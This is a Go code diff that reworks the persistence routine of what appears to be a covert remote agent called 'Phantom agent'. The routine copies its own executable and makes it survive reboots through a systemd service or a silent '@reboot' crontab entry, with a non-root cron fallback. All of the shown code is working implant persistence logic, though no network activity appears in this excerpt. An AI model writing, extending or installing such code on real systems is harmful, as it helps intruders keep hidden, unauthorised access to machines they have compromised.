@@ -8,7 +8,8 @@ import (
 	"runtime"
 )
 
-func persist() Result {
+// persist installs a reboot survival mechanism. sub = auto|systemd|cron|registry
+func persist(sub string) Result {
 	exe, err := os.Executable()
 	if err != nil {
 		return Result{OK: false, Err: err.Error()}
@@ -31,8 +32,14 @@ func persist() Result {
 	}
 	os.Chmod(dst, 0755)
 
-	if root {
-		unit := fmt.Sprintf(`[Unit]
+	if sub == "cron" || (sub != "systemd" && !root) {
+		return persistCron(dst)
+	}
+	if !root {
+		return Result{OK: false, Err: "systemd needs root (try the cron method)"}
+	}
+
+	unit := fmt.Sprintf(`[Unit]
 Description=Phantom agent
 After=network-online.target
 
@@ -44,17 +51,19 @@ RestartSec=5
 [Install]
 WantedBy=multi-user.target
 `, dst)
-		if err := os.WriteFile("/etc/systemd/system/phantom.service", []byte(unit), 0644); err != nil {
-			return Result{OK: false, Err: "unit: " + err.Error()}
-		}
-		newCmd("systemctl", "daemon-reload").Run()
-		newCmd("systemctl", "enable", "--now", "phantom.service").Run()
-		return Result{OK: true, Out: "systemd -> " + dst}
+	if err := os.WriteFile("/etc/systemd/system/phantom.service", []byte(unit), 0644); err != nil {
+		return Result{OK: false, Err: "unit: " + err.Error()}
 	}
+	newCmd("systemctl", "daemon-reload").Run()
+	newCmd("systemctl", "enable", "--now", "phantom.service").Run()
+	return Result{OK: true, Out: "systemd unit enabled -> " + dst}
+}
 
+func persistCron(dst string) Result {
 	line := "@reboot " + dst + " >/dev/null 2>&1"
 	out, err := newCmd("sh", "-c",
-		fmt.Sprintf("(crontab -l 2>/dev/null | grep -v %s; echo '%s') | crontab -", dst, line),
+		fmt.Sprintf("(crontab -l 2>/dev/null | grep -v %s; echo '%s') | crontab -",
+			dst, line),
 	).CombinedOutput()
 	if err != nil {
 		return Result{OK: false, Out: string(out), Err: "cron: " + err.Error()}
